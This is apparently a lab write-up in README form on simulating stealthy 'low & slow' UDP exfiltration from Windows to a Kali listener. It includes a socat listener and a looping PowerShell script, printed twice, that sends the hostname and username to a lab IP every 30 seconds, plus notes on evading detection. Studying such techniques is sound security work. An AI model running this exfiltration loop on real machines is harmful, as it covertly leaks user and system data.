# Project 2 – Low & Slow UDP Tunneling (Data Exfiltration)

##  Objective  
Simulate stealthy, low‑frequency data exfiltration from Windows to Kali using UDP.

---

##  Why UDP?

| Feature | Why It Works for Attackers |
| :--- | :--- |
| No connection handshake | Less noise in logs |
| No retransmission | No extra traffic |
| Commonly allowed | DNS (53), NTP (123), DHCP (67/68) |
| Packet loss is “normal” | Few lost packets raise no alarms |

We send **system information every 30 seconds** – slow enough to blend in.

---

##  Tools Used

| Tool | Purpose |
| :--- | :--- |
| Windows PowerShell | UDP client (data sender) |
| Kali `socat` | UDP listener |
| Wireshark | Packet inspection & proof |

---

##  Step‑by‑Step Execution

### 1️⃣ Kali – Start UDP listener

```bash
sudo socat -u UDP-LISTEN:1234,fork STDOUT
```

### 2️⃣ Windows – Send a single test message (PowerShell)

```powershell
$kali_ip = "192.168.64.4"
$port = 1234
$message = "Hello from Windows - test packet"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($message)
$udp = New-Object System.Net.Sockets.UdpClient
$udp.Send($bytes, $bytes.Length, $kali_ip, $port)
$udp.Close()
Write-Host "Sent: $message"
```

### 3️⃣ Windows – Automated “Low & Slow” exfiltration (every 30 sec)

```powershell
$kali_ip = "192.168.64.4"
$port = 1234

while ($true) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $data = "pc=$env:COMPUTERNAME&user=$env:USERNAME&time=$timestamp"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
    $udp = New-Object System.Net.Sockets.UdpClient
    $udp.Send($bytes, $bytes.Length, $kali_ip, $port)
    $udp.Close()
    Write-Host "Exfiltrated: $data"
    Start-Sleep -Seconds 30
}
```

---

##  What We Learned

- ❌ DNS tunneling blocked by Windows policy  
- ❌ ICMP `ping -p` not supported on Windows  
- ✅ UDP tunneling succeeded – simple, stealthy, effective  

---

## 📈 MITRE ATT&CK Mapping

| Tactic | ID | Technique |
| :--- | :--- | :--- |
| Exfiltration | TA0010 | T1048 – Exfiltration Over Alternative Protocol (UDP) |

---

## 📁 Files

- `udp_exfil.ps1` – PowerShell exfiltration script  
- `screenshots/` – Evidence images  

---

## 👤 Author

**Turhan Acar**  
[GitHub](https://github.com/btncwn) 

---

## 📜 License

**Educational Use Only** – do not deploy on production systems without permission.

---

*Project 2 – Complete. UDP exfiltration simulated, detected, and documented.* 
```

---

##  2. `udp_exfil.ps1` (PowerShell script)


```powershell
$kali_ip = "192.168.64.4"
$port = 1234

while ($true) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $data = "pc=$env:COMPUTERNAME&user=$env:USERNAME&time=$timestamp"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
    $udp = New-Object System.Net.Sockets.UdpClient
    $udp.Send($bytes, $bytes.Length, $kali_ip, $port)
    $udp.Close()
    Write-Host "Exfiltrated: $data"
    Start-Sleep -Seconds 30
}
```

---
